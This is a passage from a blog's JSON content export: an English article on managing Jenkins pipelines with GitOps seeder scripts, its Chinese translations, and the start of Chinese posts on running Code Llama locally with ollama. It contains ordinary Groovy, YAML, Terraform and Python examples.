The details of the steps of each pipeline are referenced from the Jenkinsfile in their own repository. &#x2F;&#x2F; Define the list of repositories def repositories &#x3D; [&#39;repo1&#39;, &#39;repo2&#39;, &#39;repo3&#39;] &#x2F;&#x2F; Loop through the list and create a pipeline job for each one repositories.each &#123; repo -&gt; pipelineJob(&quot;$&#123;repo&#125;-pipeline&quot;) &#123; &#x2F;&#x2F; Use the SCM trigger to run the job when there is a change in the repository triggers &#123; scm(&#39;H&#x2F;5 * * * *&#39;) &#125; &#x2F;&#x2F; Define the pipeline script path as Jenkinsfile in the root of the repository definition &#123; cpsScm &#123; scm &#123; git &#123; remote &#123; url(&quot;https:&#x2F;&#x2F;github.com&#x2F;$&#123;repo&#125;.git&quot;) &#125; branch(&#39;master&#39;) &#125; &#125; scriptPath(&#39;Jenkinsfile&#39;) &#125; &#125; &#125; &#125; Three pipelines might not seem impressive. But consider creating pipelines for multiple environments – this is where seeder scripts truly shine: &#x2F;&#x2F; Define a list of repositories and environments def repositories &#x3D; [&#39;repo1&#39;, &#39;repo2&#39;, &#39;repo3&#39;] def environments &#x3D; [&#39;dev&#39;, &#39;test&#39;, &#39;prod&#39;] &#x2F;&#x2F; Loop through the list and create a pipeline for each combination for (repo in repositories) &#123; for (env in environments) &#123; &#x2F;&#x2F; Define the pipeline name and description def pipelineName &#x3D; &quot;$&#123;repo&#125;-$&#123;env&#125;&quot; def pipelineDesc &#x3D; &quot;Pipeline for $&#123;repo&#125; in $&#123;env&#125; environment&quot; &#x2F;&#x2F; Create a pipeline job using the DSL plugin pipelineJob(pipelineName) &#123; description(pipelineDesc) &#x2F;&#x2F; Use the Jenkinsfile from the repo as the source of the pipeline definition definition &#123; cpsScm &#123; scm &#123; git &#123; remote &#123; url(&quot;https:&#x2F;&#x2F;github.com&#x2F;$&#123;repo&#125;.git&quot;) &#125; branch(&#39;master&#39;) &#125; &#125; &#x2F;&#x2F; Specify the path to the Jenkinsfile in the repo scriptPath(&quot;Jenkinsfile-$&#123;env&#125;&quot;) &#125; &#125; &#125; &#125; &#125; While seeder scripts can be used to define detailed steps in your pipeline, it’s important to keep these scripts simple and focused on managing the pipeline. Keeping seeder scripts simple makes it easier to maintain and collaborate with other team members. 💡 Best PracticeKeep your seeder scripts focused on pipeline structure and configuration. Store the actual pipeline logic in Jenkinsfiles within each repository. This separation of concerns makes both easier to maintain. Benefits of Using GitOps with Seeder Scripts Using seeder scripts can bring several benefits, including: Automation: You can automate the creation and update of Jenkins pipelines based on the changes in your Git repository. This reduces manual errors and saves time and effort. Immutability: You can keep your Jenkins pipelines immutable, meaning that they are not modified manually after they are created. This ensures consistency and reliability across different environments and stages. Versioning: You can track the history and changes of your Jenkins pipelines using Git commits and branches. This enables you to roll back to previous versions, compare different versions, and audit the changes. Collaboration: You can collaborate with other developers and teams on your Jenkins pipelines using Git features such as pull requests, code reviews, and merge conflicts. This improves the quality and security of your pipelines. Recovery: If Jenkins is corrupted or deleted by accident, you can use the seeder job to redeploy the pipelines from the Git repository. Portability: You can use GitOps to create the same set of pipelines on another Jenkins server. This is especially useful when you would like to test your pipelines with Jenkins/plugin upgrades. Advanced Patterns: Dynamic Pipeline Generation As your organization grows, you might need more sophisticated patterns. Here’s an example that reads pipeline configurations from a YAML file: &#x2F;&#x2F; Read pipeline configurations from a YAML file in the repository import org.yaml.snakeyaml.Yaml def yaml &#x3D; new Yaml() def config &#x3D; yaml.load(readFileFromWorkspace(&#39;pipelines.yaml&#39;)) &#x2F;&#x2F; Create pipelines based on the configuration config.pipelines.each &#123; pipeline -&gt; pipelineJob(pipeline.name) &#123; description(pipeline.description) &#x2F;&#x2F; Set up parameters if defined if (pipeline.parameters) &#123; parameters &#123; pipeline.parameters.each &#123; param -&gt; stringParam(param.name, param.defaultValue, param.description) &#125; &#125; &#125; definition &#123; cpsScm &#123; scm &#123; git &#123; remote &#123; url(pipeline.repository) credentials(pipeline.credentials) &#125; branch(pipeline.branch ?: &#39;main&#39;) &#125; &#125; scriptPath(pipeline.jenkinsfile ?: &#39;Jenkinsfile&#39;) &#125; &#125; &#125; &#125; With a corresponding pipelines.yaml: pipelines: - name: microservice-api-prod description: Production deployment for API service repository: https:&#x2F;&#x2F;github.com&#x2F;company&#x2F;api-service.git branch: main jenkinsfile: deploy&#x2F;Jenkinsfile.prod credentials: github-token parameters: - name: VERSION defaultValue: latest description: Version to deploy - name: ENVIRONMENT defaultValue: production description: Target environment Challenges and Solutions However, there are also some challenges that you need to take care of when using GitOps to generate Jenkins pipelines. ⚠️ Pipeline Deletion and Audit LogsWhen you use GitOps to generate Jenkins pipelines, you may also use GitOps to destroy them when they are no longer needed. However, this may cause problems if you need to keep the output from pipeline executions (console logs) for auditing or troubleshooting purposes. Solutions to consider: External Log Storage: Use a separate storage system like Elasticsearch, CloudWatch, or S3 to archive logs before pipeline deletion Soft Deletion: Mark pipelines as deprecated rather than deleting them immediately Retention Policies: Implement automated archival with configurable retention periods &#x2F;&#x2F; Example: Archive logs before deletion def archivePipelineLogs(pipelineName) &#123; def builds &#x3D; Jenkins.instance.getItemByFullName(pipelineName).builds builds.each &#123; build -&gt; &#x2F;&#x2F; Archive to S3 or external storage archiveToS3(build.logFile, &quot;jenkins-logs&#x2F;$&#123;pipelineName&#125;&#x2F;$&#123;build.number&#125;&quot;) &#125; &#125; Security Considerations 🔒 Security Best PracticesGitOps introduces new security considerations since your pipeline configurations are stored in Git. Key security practices: Credential Management: Never store credentials in seeder scripts. Use Jenkins Credentials Plugin and reference them by ID Access Control: Implement branch protection and require code reviews for seeder script changes Audit Trail: Enable Git commit signing to verify the authenticity of changes Least Privilege: Grant seeder jobs only the permissions needed to create/update pipelines &#x2F;&#x2F; Good: Reference credentials by ID credentials(&#39;github-api-token&#39;) &#x2F;&#x2F; Bad: Never do this! &#x2F;&#x2F; credentials(&#39;username&#39;, &#39;hardcoded-password&#39;) Testing Your Seeder Scripts Before deploying seeder scripts to production Jenkins, test them in a sandbox environment: &#x2F;&#x2F; Add a dry-run mode to your seeder script def dryRun &#x3D; System.getenv(&#39;DRY_RUN&#39;) &#x3D;&#x3D; &#39;true&#39; repositories.each &#123; repo -&gt; if (dryRun) &#123; println &quot;Would create pipeline: $&#123;repo&#125;-pipeline&quot; &#125; else &#123; pipelineJob(&quot;$&#123;repo&#125;-pipeline&quot;) &#123; &#x2F;&#x2F; ... actual pipeline creation &#125; &#125; &#125; Monitoring and Observability Track the health of your GitOps-managed pipelines: Pipeline Creation Metrics: Monitor how many pipelines are created/updated/deleted Sync Status: Ensure Git state matches Jenkins state Failure Alerts: Get notified when seeder jobs fail graph TD A[Git Commit] -->|Webhook| B[Seeder Job] B -->|Success| C[Update Metrics] B -->|Failure| D[Send Alert] C --> E[Dashboard] D --> F[Ops Team] E --> G{Drift Detected?} G -->|Yes| H[Reconciliation] G -->|No| I[Healthy State] style B fill:#87CEEB style C fill:#90EE90 style D fill:#FFB6C6 State Management Patterns As your GitOps implementation matures, you’ll need to decide how to handle state – the record of what’s actually deployed versus what’s defined in Git. 📦 State Sync: Object Store vs Git VersioningWhile GitOps traditionally uses Git for state management, some teams store state in object stores (S3, Azure Blob) instead of versioning it in Git. Why use object stores for state? Size Limitations: Terraform state files or large configuration outputs can bloat Git repositories, making clones slow and history unwieldy Binary Data: State files often contain binary or frequently-changing data that doesn't benefit from Git's diff capabilities Concurrency: Object stores with locking mechanisms (like S3 + DynamoDB) prevent concurrent modifications better than Git merge conflicts Performance: Reading/writing large state files is faster with object stores than Git operations Separation of Concerns: Configuration (Git) vs runtime state (object store) are fundamentally different - one is intent, the other is reality Think of it like building plans vs inspection reports: you version control the blueprints (Git), but store the inspection results in a filing cabinet (object store). While we’ve focused on Jenkins, the same state management principles apply to other infrastructure tools. Let’s look at how Terraform handles this: State Management Example: Terraform with S3 Backend Tools like Terraform natively support storing state in object stores. Here’s how you configure Terraform to use S3 for state while keeping your infrastructure code in Git: # backend.tf - Stored in Git terraform &#123; backend &quot;s3&quot; &#123; bucket &#x3D; &quot;company-terraform-state&quot; key &#x3D; &quot;jenkins&#x2F;terraform.tfstate&quot; region &#x3D; &quot;us-east-1&quot; dynamodb_table &#x3D; &quot;terraform-locks&quot; encrypt &#x3D; true &#125; &#125; # main.tf - Infrastructure code in Git resource &quot;aws_instance&quot; &quot;jenkins&quot; &#123; ami &#x3D; &quot;ami-12345678&quot; instance_type &#x3D; &quot;t3.medium&quot; tags &#x3D; &#123; Name &#x3D; &quot;Jenkins-Server&quot; &#125; &#125; In this setup: Git stores: Infrastructure code (what you want) S3 stores: State file (what you have) DynamoDB: Provides state locking to prevent concurrent modifications Real-World Example: Multi-Team Pipeline Management In large organizations, different teams may need different pipeline patterns: &#x2F;&#x2F; Team-specific pipeline templates def teamConfigs &#x3D; [ &#39;backend&#39;: [ jenkinsfile: &#39;ci&#x2F;Jenkinsfile.backend&#39;, agents: [&#39;docker&#39;], stages: [&#39;build&#39;, &#39;test&#39;, &#39;security-scan&#39;, &#39;deploy&#39;] ], &#39;frontend&#39;: [ jenkinsfile: &#39;ci&#x2F;Jenkinsfile.frontend&#39;, agents: [&#39;nodejs&#39;], stages: [&#39;build&#39;, &#39;test&#39;, &#39;e2e&#39;, &#39;deploy&#39;] ], &#39;data&#39;: [ jenkinsfile: &#39;ci&#x2F;Jenkinsfile.data&#39;, agents: [&#39;python&#39;], stages: [&#39;validate&#39;, &#39;test&#39;, &#39;deploy&#39;] ] ] &#x2F;&#x2F; Read team repositories from configuration def repositories &#x3D; readJSON(file: &#39;team-repos.json&#39;) repositories.each &#123; repo -&gt; def teamConfig &#x3D; teamConfigs[repo.team] pipelineJob(&quot;$&#123;repo.team&#125;-$&#123;repo.name&#125;&quot;) &#123; description(&quot;$&#123;repo.team&#125; team pipeline for $&#123;repo.name&#125;&quot;) definition &#123; cpsScm &#123; scm &#123; git &#123; remote &#123; url(repo.url) credentials(&quot;$&#123;repo.team&#125;-github-token&quot;) &#125; branch(repo.branch ?: &#39;main&#39;) &#125; &#125; scriptPath(teamConfig.jenkinsfile) &#125; &#125; &#x2F;&#x2F; Team-specific configurations properties &#123; pipelineTriggers &#123; triggers &#123; githubPush() &#125; &#125; &#125; &#125; &#125; Beyond Jenkins: GitOps Everywhere GitOps is a concept that you can apply to automate everything Ops by using Git as a single source of truth. Jenkins is just one of the applications. The same principles apply to: Infrastructure as Code: Terraform, CloudFormation, Pulumi Kubernetes: ArgoCD, Flux for cluster management Configuration Management: Ansible, Chef, Puppet Monitoring: Grafana dashboards, Prometheus rules ✨ Key TakeawayGitOps transforms operations from manual, error-prone processes into automated, auditable, and reproducible workflows. By treating everything as code and using Git as the source of truth, you gain version control, collaboration, and reliability for your entire infrastructure. 🚀 Getting StartedReady to implement GitOps for your Jenkins pipelines? Start small: Convert one manual pipeline to a seeder script Test in sandbox: Use a non-production Jenkins instance first Expand gradually: Add more pipelines once you're comfortable Add observability: Implement monitoring and alerting once stable Document patterns: Create templates for your team to follow","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"GitOps","slug":"GitOps","permalink":"https://neo01.com/tags/GitOps/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://neo01.com/tags/Jenkins/"},{"name":"Groovy","slug":"Groovy","permalink":"https://neo01.com/tags/Groovy/"}]},{"title":"Jenkins 管道上的 GitOps","slug":"2023/09/GitOps_on_Jenkins-zh-TW","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-TW/2023/09/GitOps_on_Jenkins/","permalink":"https://neo01.com/zh-TW/2023/09/GitOps_on_Jenkins/","excerpt":"凌晨3點部署出錯？只需 git revert 即可回滾！學習如何用種子腳本實現 Jenkins 管道的 GitOps。","text":"什麼是 GitOps？ 想像一下：凌晨 3 點，部署出錯了。你不必瘋狂地點擊 Jenkins UI 試圖記住你改變了什麼，而是簡單地執行 git revert 並重新部署。這就是 GitOps 的力量。 GitOps 意味著像管理 Git 中的程式碼一樣管理你的整個基礎設施——每個變更都被追蹤，每個部署都可重現，每個回滾只需一次提交。 GitOps 是一種使用 Git 作為單一事實來源來管理基礎設施和應用程式的方法。它讓你在程式碼中定義所需狀態，然後使用工具將該狀態應用到你的環境中。GitOps 實現持續交付，因為 Git 儲存庫中的任何變更都會觸發部署新版本程式碼的管道。 graph LR A([開發者]) -->|提交| B[(Git 儲存庫)] B -->|觸發| C[CI/CD 管道] E[(物件儲存)] -->|讀取狀態| C C -->|部署| D[基礎設施] D -->|寫入狀態| E style B fill:#87CEEB style C fill:#90EE90 style D fill:#FFD700 style E fill:#FFA07A Jenkins 管道的 GitOps 在 Jenkins 管道的上下文中，GitOps 可用於透過將管道配置視為程式碼並使用 Git 管理對該程式碼的變更來管理管道。這允許開發者對其管道配置進行版本控制，與其他團隊成員協作變更，並在必要時輕鬆回滾變更。 換句話說：不是手動點擊 Jenkins UI 來建立和配置管道，而是編寫描述你想要的管道的程式碼，將其提交到 Git，並讓自動化為你建立它們。 使用種子腳本管理 Jenkins 管道 種子腳本是用於在 Jenkins 上建立和維護管道的腳本。它通常用 Groovy 腳本編寫。 以下是在 Jenkins 中建立管道的種子腳本範例。該腳本使用 Job DSL 外掛以宣告方式定義管道作業。腳本循環遍歷儲存庫清單並為每個儲存庫建立管道作業。每個管道的步驟詳細資訊從其自己儲存庫中的 Jenkinsfile 引用。 三個管道可能看起來不太令人印象深刻。但考慮為多個環境建立管道——這就是種子腳本真正發揮作用的地方。 雖然種子腳本可用於定義管道中的詳細步驟，但重要的是保持這些腳本簡單並專注於管理管道。保持種子腳本簡單使其更容易維護並與其他團隊成員協作。 💡 最佳實踐保持你的種子腳本專注於管道結構和配置。將實際的管道邏輯儲存在每個儲存庫內的 Jenkinsfile 中。這種關注點分離使兩者都更容易維護。 使用種子腳本的好處 使用種子腳本可以帶來幾個好處，包括： 自動化：你可以根據 Git 儲存庫中的變更自動建立和更新 Jenkins 管道。這減少了手動錯誤並節省了時間和精力。 不可變性：你可以保持 Jenkins 管道不可變，這意味著它們在建立後不會手動修改。這確保了不同環境和階段之間的一致性和可靠性。 版本控制：你可以使用 Git 提交和分支追蹤 Jenkins 管道的歷史和變更。這使你能夠回滾到以前的版本、比較不同版本並稽核變更。 協作：你可以使用 Git 功能（如拉取請求、程式碼審查和合併衝突）與其他開發者和團隊協作處理 Jenkins 管道。這提高了管道的品質和安全性。 恢復：如果 Jenkins 意外損壞或刪除，你可以使用種子作業從 Git 儲存庫重新部署管道。 可移植性：你可以使用 GitOps 在另一個 Jenkins 伺服器上建立相同的管道集。這在你想使用 Jenkins/外掛升級測試管道時特別有用。 挑戰和解決方案 然而，當使用 GitOps 產生 Jenkins 管道時，你需要注意一些挑戰。 ⚠️ 管道刪除和稽核日誌當你使用 GitOps 產生 Jenkins 管道時，你也可以使用 GitOps 在不再需要時銷毀它們。然而，如果你需要保留管道執行的輸出（控制台日誌）以進行稽核或故障排除，這可能會導致問題。 要考慮的解決方案： 外部日誌儲存：在刪除管道之前，使用單獨的儲存系統（如 Elasticsearch、CloudWatch 或 S3）歸檔日誌 軟刪除：將管道標記為已棄用，而不是立即刪除它們 保留策略：實施具有可配置保留期的自動歸檔 安全考慮 🔒 安全最佳實踐GitOps 引入了新的安全考慮，因為你的管道配置儲存在 Git 中。 關鍵安全實踐： 憑證管理：永遠不要在種子腳本中儲存憑證。使用 Jenkins 憑證外掛並透過 ID 引用它們 存取控制：實施分支保護並要求對種子腳本變更進行程式碼審查 稽核追蹤：啟用 Git 提交簽署以驗證變更的真實性 最小權限：僅授予種子作業建立/更新管道所需的權限 狀態管理模式 隨著你的 GitOps 實施成熟，你需要決定如何處理狀態——實際部署的內容與 Git 中定義的內容的記錄。 📦 狀態同步：物件儲存 vs Git 版本控制雖然 GitOps 傳統上使用 Git 進行狀態管理，但一些團隊將狀態儲存在物件儲存（S3、Azure Blob）中，而不是在 Git 中進行版本控制。 為什麼使用物件儲存來儲存狀態？ 大小限制：Terraform 狀態檔案或大型配置輸出可能會使 Git 儲存庫膨脹，使複製變慢且歷史記錄笨重 二進位資料：狀態檔案通常包含二進位或頻繁變更的資料，這些資料不會從 Git 的差異功能中受益 並行性：具有鎖定機制的物件儲存（如 S3 + DynamoDB）比 Git 合併衝突更好地防止並行修改 效能：使用物件儲存讀取/寫入大型狀態檔案比 Git 操作更快 關注點分離：配置（Git）與執行時狀態（物件儲存）本質上是不同的——一個是意圖，另一個是現實 把它想像成建築計畫與檢查報告：你對藍圖進行版本控制（Git），但將檢查結果儲存在檔案櫃中（物件儲存）。 超越 Jenkins：無處不在的 GitOps GitOps 是一個概念，你可以透過使用 Git 作為單一事實來源來應用於自動化一切營運。Jenkins 只是其中一個應用程式。相同的原則適用於： 基礎設施即代碼：Terraform、CloudFormation、Pulumi Kubernetes：ArgoCD、Flux 用於叢集管理 配置管理：Ansible、Chef、Puppet 監控：Grafana 儀表板、Prometheus 規則 ✨ 關鍵要點GitOps 將營運從手動、容易出錯的流程轉變為自動化、可稽核和可重現的工作流程。透過將一切視為程式碼並使用 Git 作為事實來源，你可以獲得整個基礎設施的版本控制、協作和可靠性。 🚀 入門準備為你的 Jenkins 管道實施 GitOps？ 從小處開始：將一個手動管道轉換為種子腳本 在沙盒中測試：首先使用非生產 Jenkins 實例 逐步擴展：一旦你感到舒適，新增更多管道 新增可觀察性：一旦穩定，實施監控和警報 記錄模式：為你的團隊建立範本以遵循","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"GitOps","slug":"GitOps","permalink":"https://neo01.com/tags/GitOps/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://neo01.com/tags/Jenkins/"},{"name":"Groovy","slug":"Groovy","permalink":"https://neo01.com/tags/Groovy/"}],"lang":"zh-TW"},{"title":"Jenkins 管道上的 GitOps","slug":"2023/09/GitOps_on_Jenkins-zh-CN","date":"un11fin11","updated":"un66fin66","comments":true,"path":"/zh-CN/2023/09/GitOps_on_Jenkins/","permalink":"https://neo01.com/zh-CN/2023/09/GitOps_on_Jenkins/","excerpt":"凌晨3点部署出错？只需 git revert 即可回滚！学习如何用种子脚本实现 Jenkins 管道的 GitOps。","text":"什么是 GitOps？ 想象一下：凌晨 3 点，部署出错了。你不必疯狂地点击 Jenkins UI 试图记住你改变了什么，而是简单地运行 git revert 并重新部署。这就是 GitOps 的力量。 GitOps 意味着像管理 Git 中的代码一样管理你的整个基础设施——每个更改都被跟踪，每个部署都可重现，每个回滚只需一次提交。 GitOps 是一种使用 Git 作为单一事实来源来管理基础设施和应用程序的方法。它让你在代码中定义所需状态，然后使用工具将该状态应用到你的环境中。GitOps 实现持续交付，因为 Git 仓库中的任何更改都会触发部署新版本代码的管道。 graph LR A([开发者]) -->|提交| B[(Git 仓库)] B -->|触发| C[CI/CD 管道] E[(对象存储)] -->|读取状态| C C -->|部署| D[基础设施] D -->|写入状态| E style B fill:#87CEEB style C fill:#90EE90 style D fill:#FFD700 style E fill:#FFA07A Jenkins 管道的 GitOps 在 Jenkins 管道的上下文中，GitOps 可用于通过将管道配置视为代码并使用 Git 管理对该代码的更改来管理管道。这允许开发者对其管道配置进行版本控制，与其他团队成员协作更改，并在必要时轻松回滚更改。 换句话说：不是手动点击 Jenkins UI 来创建和配置管道，而是编写描述你想要的管道的代码，将其提交到 Git，并让自动化为你创建它们。 使用种子脚本管理 Jenkins 管道 种子脚本是用于在 Jenkins 上创建和维护管道的脚本。它通常用 Groovy 脚本编写。 以下是在 Jenkins 中创建管道的种子脚本示例。该脚本使用 Job DSL 插件以声明方式定义管道作业。脚本循环遍历仓库列表并为每个仓库创建管道作业。每个管道的步骤详细信息从其自己仓库中的 Jenkinsfile 引用。 三个管道可能看起来不太令人印象深刻。但考虑为多个环境创建管道——这就是种子脚本真正发挥作用的地方。 虽然种子脚本可用于定义管道中的详细步骤，但重要的是保持这些脚本简单并专注于管理管道。保持种子脚本简单使其更容易维护并与其他团队成员协作。 💡 最佳实践保持你的种子脚本专注于管道结构和配置。将实际的管道逻辑存储在每个仓库内的 Jenkinsfile 中。这种关注点分离使两者都更容易维护。 使用种子脚本的好处 使用种子脚本可以带来几个好处，包括： 自动化：你可以根据 Git 仓库中的更改自动创建和更新 Jenkins 管道。这减少了手动错误并节省了时间和精力。 不可变性：你可以保持 Jenkins 管道不可变，这意味着它们在创建后不会手动修改。这确保了不同环境和阶段之间的一致性和可靠性。 版本控制：你可以使用 Git 提交和分支跟踪 Jenkins 管道的历史和更改。这使你能够回滚到以前的版本、比较不同版本并审计更改。 协作：你可以使用 Git 功能（如拉取请求、代码审查和合并冲突）与其他开发者和团队协作处理 Jenkins 管道。这提高了管道的质量和安全性。 恢复：如果 Jenkins 意外损坏或删除，你可以使用种子作业从 Git 仓库重新部署管道。 可移植性：你可以使用 GitOps 在另一个 Jenkins 服务器上创建相同的管道集。这在你想使用 Jenkins/插件升级测试管道时特别有用。 挑战和解决方案 然而，当使用 GitOps 生成 Jenkins 管道时，你需要注意一些挑战。 ⚠️ 管道删除和审计日志当你使用 GitOps 生成 Jenkins 管道时，你也可以使用 GitOps 在不再需要时销毁它们。然而，如果你需要保留管道执行的输出（控制台日志）以进行审计或故障排除，这可能会导致问题。 要考虑的解决方案： 外部日志存储：在删除管道之前，使用单独的存储系统（如 Elasticsearch、CloudWatch 或 S3）归档日志 软删除：将管道标记为已弃用，而不是立即删除它们 保留策略：实施具有可配置保留期的自动归档 安全考虑 🔒 安全最佳实践GitOps 引入了新的安全考虑，因为你的管道配置存储在 Git 中。 关键安全实践： 凭证管理：永远不要在种子脚本中存储凭证。使用 Jenkins 凭证插件并通过 ID 引用它们 访问控制：实施分支保护并要求对种子脚本更改进行代码审查 审计追踪：启用 Git 提交签名以验证更改的真实性 最小权限：仅授予种子作业创建/更新管道所需的权限 状态管理模式 随着你的 GitOps 实施成熟，你需要决定如何处理状态——实际部署的内容与 Git 中定义的内容的记录。 📦 状态同步：对象存储 vs Git 版本控制虽然 GitOps 传统上使用 Git 进行状态管理，但一些团队将状态存储在对象存储（S3、Azure Blob）中，而不是在 Git 中进行版本控制。 为什么使用对象存储来存储状态？ 大小限制：Terraform 状态文件或大型配置输出可能会使 Git 仓库膨胀，使克隆变慢且历史记录笨重 二进制数据：状态文件通常包含二进制或频繁更改的数据，这些数据不会从 Git 的差异功能中受益 并发性：具有锁定机制的对象存储（如 S3 + DynamoDB）比 Git 合并冲突更好地防止并发修改 性能：使用对象存储读取/写入大型状态文件比 Git 操作更快 关注点分离：配置（Git）与运行时状态（对象存储）本质上是不同的——一个是意图，另一个是现实 把它想象成建筑计划与检查报告：你对蓝图进行版本控制（Git），但将检查结果存储在文件柜中（对象存储）。 超越 Jenkins：无处不在的 GitOps GitOps 是一个概念，你可以通过使用 Git 作为单一事实来源来应用于自动化一切运维。Jenkins 只是其中一个应用程序。相同的原则适用于： 基础设施即代码：Terraform、CloudFormation、Pulumi Kubernetes：ArgoCD、Flux 用于集群管理 配置管理：Ansible、Chef、Puppet 监控：Grafana 仪表板、Prometheus 规则 ✨ 关键要点GitOps 将运维从手动、容易出错的流程转变为自动化、可审计和可重现的工作流程。通过将一切视为代码并使用 Git 作为事实来源，你可以获得整个基础设施的版本控制、协作和可靠性。 🚀 入门准备为你的 Jenkins 管道实施 GitOps？ 从小处开始：将一个手动管道转换为种子脚本 在沙盒中测试：首先使用非生产 Jenkins 实例 逐步扩展：一旦你感到舒适，添加更多管道 添加可观察性：一旦稳定，实施监控和警报 记录模式：为你的团队创建模板以遵循","categories":[{"name":"Development","slug":"Development","permalink":"https://neo01.com/categories/Development/"}],"tags":[{"name":"GitOps","slug":"GitOps","permalink":"https://neo01.com/tags/GitOps/"},{"name":"Jenkins","slug":"Jenkins","permalink":"https://neo01.com/tags/Jenkins/"},{"name":"Groovy","slug":"Groovy","permalink":"https://neo01.com/tags/Groovy/"}],"lang":"zh-CN"},{"title":"我最好的 CoPilot 替代方案 - 在本地运行 LLM","slug":"2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine-zh-CN","date":"un00fin00","updated":"un00fin00","comments":true,"path":"/zh-CN/2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine/","permalink":"https://neo01.com/zh-CN/2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine/","excerpt":"用 200 美元二手显卡运行 Code Llama，数据不出本地，100k 令牌超过 CoPilot！","text":"我一直在寻找新的创新工具来帮助我提高编码技能并提高生产力。最近，我偶然发现了 Code Llama，这是由 Meta 开发的免费开源大型语言模型（LLM），您可以在低成本的游戏台式机上设置。在这篇博客文章中，我将分享我使用 Code Llama 的经验，以及它如何成为 GitHub CoPilot 的绝佳替代方案。 使用 ollama 设置 Code Llama ollama（https://ollama.ai/）使用类似 Dockerfile 的配置文件。它还管理从 LLM 到系统提示的 Docker 层。ollama 在设置和运行 Code Llama 方面提供了很大的帮助。尽管网站说 Windows 即将推出，但我遵循 https://github.com/jmorganca/ollama 中的步骤并成功运行。以下是我的设置， Windows 11 WSL 2 与 Ubuntu Nvidia 3060 12GB https://github.com/jmorganca/ollama 如果您没有足够的显示内存，它会退回到系统 RAM 和 CPU。 有许多模型供您选择（https://ollama.ai/library），但您应该首先尝试 Code Llama。您可以使用 ollama pull codellama 像 docker 镜像一样拉取 Code Llama。然而，有一个许可协议需要接受（https://ai.meta.com/resources/models-and-libraries/llama-downloads/）。一旦您请求、接受并获得批准，您就可以开始使用它。如果您不这样做，还有许多其他库可以尝试。 ❓ 为什么我选择显示卡上的 12GB 显示内存而不是 8GB、16GB、24GB？ 8GB 显示卡更常见且更便宜，但额外的 4GB 显示内存（VRAM）可以让您在下一个层级运行更大的模型。LLM 通常以 3 个层级构建，具有不同的模型参数大小，每个层级大约使用一定量的 VRAM。下面显示 12GB 适合 7B 和 13B。超过 12GB 的 RAM 是浪费，除非您花时间量化下一层级的模型并接受量化后模型运行速度会慢得多。Code Llama 提供了一个 34B 模型，您可以使用 24GB，这是 24GB 显示卡的唯一使用案例。 模型 存储大小 典型内存使用量 VRAM 8GB VRAM 12GB VRAM 24GB VRAM 2 X 24GB 7B 4GB 7GB ❌ ✅ ✅ ✅ 13B 8GB 11GB ❌ ❌ ✅ ✅ 34B 19GB 23GB ❌ ❌ ✅ ✅ 70B 40GB 35GB ❌ ❌ ❌ ✅ 消费级显示卡的最大显示内存大小为 24GB，因此您需要两张显示卡。 如何使用 Visual Studio Code 设置 Code Llama 使用 Visual Studio Code 设置 Code Llama 既简单又直接。搜索并安装 Visual Studio Code 扩展&quot;Continue&quot;。此扩展允许您使用来自服务提供商的 LLM 和本地 LLM 服务（如 ollama）。&quot;Continue&quot;启动交互式教程，您应该开始愉快地使用它。 本地 vs CoPilot（或任何其他基于订阅的服务） 还有许多其他免费的类似 CoPilot 的服务提供商。免费服务的质量通常很差，所以我不会在下表中比较它们， 功能 本地 CoPilot（或任何其他基于订阅的服务） 拥有成本 二手 nVidia 3060 12GB 200 美元。不包括我已经拥有的 PC 台式机 - 价格 免费。电费每月约 1kWh，可以忽略不计 基于订阅，每月 10 美元起 ROI 20 个月 - 可供选择的 LLM 许多。有特定编程语言的模型。 取决于提供商 输入令牌限制 100k（Code Llama） 1500（Copilot） 设置 使用 ollama 相当容易 简单 隐私 您的数据保留在本地 数据发送到第三方进行处理 输入令牌是上下文的&quot;记忆&quot;。GPT4 的输入令牌是 8k；这就是为什么当您的需求复杂时，您会觉得生成的代码比 CoPilot 更好。请注意，由于技术进步迅速，数字可能不准确。 重要的是要记住，生成代码的质量不仅取决于使用的模型，还取决于系统提示和提供的上下文。这是因为有很多模型可以使用，提示可能比模型更重要。您可以自定义最适合您的系统提示，并从 Continue 疯狂地在模型之间切换。例如，如果您没有适当的系统提示或您的上下文已经混乱，Code Llama 和 GPT4 都可能生成以下糟糕的代码， 没有系统提示 write a python function to generate six unique numbers from 1 to 49 import random def get_unique_numbers(n): nums &#x3D; [] while len(nums) &lt; n: num &#x3D; random.randint(1, 49) if num not in nums: nums.append(num) return nums 一个简单的系统提示会产生很大的差异。更不用说您可以使用 ollama 和 Continue 轻松切换的其他参数，例如温度 系统提示：您是一位经验丰富的程序员，专注于使用单行代码解决问题。 Write a python function to generate six unique numbers from 1 to 49. def generate_unique_numbers(n): return random.sample(range(1, n), k&#x3D;6) 结论 安全和隐私是我最关心的问题。运行 LLM 是我的最佳选择。","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/tags/AI/"}],"lang":"zh-CN"},{"title":"我最好的 CoPilot 替代方案 - 在本機執行 LLM","slug":"2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine-zh-TW","date":"un00fin00","updated":"un00fin00","comments":true,"path":"/zh-TW/2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine/","permalink":"https://neo01.com/zh-TW/2023/09/My_Best_CoPilot_Alternative_Running_LLM_on_Local_Machine/","excerpt":"用 200 美元二手顯卡執行 Code Llama，資料不出本機，100k 權杖超過 CoPilot！","text":"我一直在尋找新的創新工具來幫助我提高編碼技能並提高生產力。最近，我偶然發現了 Code Llama，這是由 Meta 開發的免費開源大型語言模型（LLM），您可以在低成本的遊戲桌機上設定。在這篇部落格文章中，我將分享我使用 Code Llama 的經驗，以及它如何成為 GitHub CoPilot 的絕佳替代方案。 使用 ollama 設定 Code Llama ollama（https://ollama.ai/）使用類似 Dockerfile 的配置檔案。它還管理從 LLM 到系統提示的 Docker 層。ollama 在設定和執行 Code Llama 方面提供了很大的幫助。儘管網站說 Windows 即將推出，但我遵循 https://github.com/jmorganca/ollama 中的步驟並成功執行。以下是我的設定， Windows 